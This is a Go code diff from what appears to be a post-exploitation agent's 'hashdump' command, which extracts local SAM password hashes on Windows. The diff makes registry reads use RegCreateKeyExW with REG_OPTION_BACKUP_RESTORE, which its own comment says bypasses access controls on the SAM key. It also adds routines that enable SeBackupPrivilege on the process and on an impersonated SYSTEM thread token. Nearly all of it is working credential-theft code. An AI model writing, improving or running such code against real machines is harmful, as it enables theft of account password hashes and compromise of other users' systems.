@@ -23,16 +23,17 @@ import (
 )
 
 var (
-	advapi32HD          = windows.NewLazySystemDLL("advapi32.dll")
-	procRegOpenKeyExW   = advapi32HD.NewProc("RegOpenKeyExW")
+	advapi32HD           = windows.NewLazySystemDLL("advapi32.dll")
+	procRegCreateKeyExW  = advapi32HD.NewProc("RegCreateKeyExW")
 	procRegQueryInfoKeyW = advapi32HD.NewProc("RegQueryInfoKeyW")
 	procRegQueryValueExW = advapi32HD.NewProc("RegQueryValueExW")
-	procRegEnumKeyExW   = advapi32HD.NewProc("RegEnumKeyExW")
-	procRegCloseKey     = advapi32HD.NewProc("RegCloseKey")
+	procRegEnumKeyExW    = advapi32HD.NewProc("RegEnumKeyExW")
+	procRegCloseKey      = advapi32HD.NewProc("RegCloseKey")
 )
 
 const (
-	hkeyLocalMachine = uintptr(0x80000002)
+	hkeyLocalMachine       = uintptr(0x80000002)
+	regOptionBackupRestore = 0x00000004
 )
 
 // HashdumpCommand implements local SAM hash extraction
@@ -62,10 +63,10 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Enable SeDebugPrivilege and SeBackupPrivilege
-	enableDebugPrivilege()
-	enableThreadDebugPrivilege()
+	// Enable SeBackupPrivilege on both process and thread tokens
+	// Thread token is needed when impersonating SYSTEM via getsystem
 	enableBackupPrivilege()
+	enableThreadBackupPrivilege()
 
 	// Step 1: Extract boot key from SYSTEM hive
 	bootKey, err := extractBootKey()
@@ -138,19 +139,25 @@ var (
 // Boot key permutation table
 var bootKeyPerm = []int{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
 
-// regOpenKey opens a registry key
+// regOpenKey opens a registry key using RegCreateKeyExW with REG_OPTION_BACKUP_RESTORE.
+// This bypasses DACLs on restricted keys (like SAM) when SeBackupPrivilege is held.
 func regOpenKey(root uintptr, path string) (uintptr, error) {
 	pathPtr, _ := windows.UTF16PtrFromString(path)
 	var hKey uintptr
-	ret, _, err := procRegOpenKeyExW.Call(
+	var disposition uint32
+	ret, _, err := procRegCreateKeyExW.Call(
 		root,
 		uintptr(unsafe.Pointer(pathPtr)),
-		0,
+		0, // Reserved
+		0, // Class (nil)
+		regOptionBackupRestore,
 		uintptr(windows.KEY_READ),
+		0, // Security attributes (nil)
 		uintptr(unsafe.Pointer(&hKey)),
+		uintptr(unsafe.Pointer(&disposition)),
 	)
 	if ret != 0 {
-		return 0, fmt.Errorf("RegOpenKeyExW(%s): %v (code %d)", path, err, ret)
+		return 0, fmt.Errorf("RegCreateKeyExW(%s): %v (code %d)", path, err, ret)
 	}
 	return hKey, nil
 }
@@ -616,6 +623,31 @@ func enableBackupPrivilege() error {
 		return err
 	}
 	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
+	if err != nil {
+		return err
+	}
+	defer token.Close()
+
+	var luid windows.LUID
+	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
+	if err != nil {
+		return err
+	}
+
+	tp := windows.Tokenprivileges{
+		PrivilegeCount: 1,
+		Privileges: [1]windows.LUIDAndAttributes{
+			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
+		},
+	}
+	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
+}
+
+// enableThreadBackupPrivilege enables SeBackupPrivilege on the current thread's
+// impersonation token (needed when running under getsystem)
+func enableThreadBackupPrivilege() error {
+	var token windows.Token
+	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
 	if err != nil {
 		return err
 	}
